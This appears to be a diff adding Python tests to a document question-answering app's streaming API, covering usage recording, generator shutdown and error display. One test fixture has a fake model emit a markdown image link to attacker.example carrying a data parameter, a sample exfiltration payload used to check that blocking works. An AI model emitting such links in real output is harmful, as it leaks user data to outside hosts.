@@ -149,3 +149,57 @@ def test_the_page_reads_the_stream_and_shows_text_only(tmp_path):
     assert "async function streamAsk" in page and "/v1/ask/stream" in page
     assert "shown.data += text" in page and "replaced after the final check" in page
     assert ".innerHTML" not in page  # streamed text is untrusted: only text nodes and textContent
+
+
+# ---- fixes from the ultrareview of the streaming work ---------------------------------------------
+
+def test_a_blocked_stream_records_unknown_token_counts_not_zero(tmp_path):
+    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "Sure. ![x](https://attacker.example/p.png?d=1) done."))
+    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
+    ask_stream(client, doc_id)
+    saved = json.loads(next((tmp_path / "uploads" / doc_id / "chat").glob("*.json")).read_text(encoding="utf-8"))
+    usage = saved["config"]["usage"]
+    assert usage["usage_known"] is False and usage["prompt_tokens"] is None and usage["output_tokens"] is None
+    assert usage["blocked"]  # and the block itself is still recorded
+
+
+def test_a_finished_stream_keeps_the_real_token_counts(tmp_path):
+    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "Copies on several nodes [S1]."))
+    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
+    ask_stream(client, doc_id)
+    usage = json.loads(next((tmp_path / "uploads" / doc_id / "chat").glob("*.json")).read_text(encoding="utf-8"))["config"]["usage"]
+    assert "usage_known" not in usage and usage["prompt_tokens"] == 0  # the fake model reports 0; a real one reports its count
+
+
+def test_a_generator_still_running_in_a_worker_thread_is_closed_once_it_pauses():
+    import threading
+    import time
+
+    from rag.api.main import _close_when_idle
+
+    closed = threading.Event()
+    started = threading.Event()
+
+    def slow():
+        try:
+            started.set()
+            time.sleep(0.4)  # a worker thread is "inside" the generator for a while
+            yield "piece"
+            yield "never reached"
+        finally:
+            closed.set()
+
+    generator = slow()
+    worker = threading.Thread(target=lambda: next(generator), daemon=True)
+    worker.start()
+    assert started.wait(2)
+    began = time.monotonic()
+    _close_when_idle(generator, seconds=3)  # closing a running generator raises ValueError; this waits for it to pause
+    assert closed.wait(2) and time.monotonic() - began < 3
+
+
+def test_a_failed_ask_leaves_one_bubble_and_the_page_has_no_second_one(tmp_path):
+    client, _ = make_client(tmp_path)
+    page = client.get("/").text
+    assert "const failed" not in page  # the old second bubble is gone
+    assert 'msg.append(el("br"), longText(err.message))' in page  # the reason goes into the same bubble, folded when long
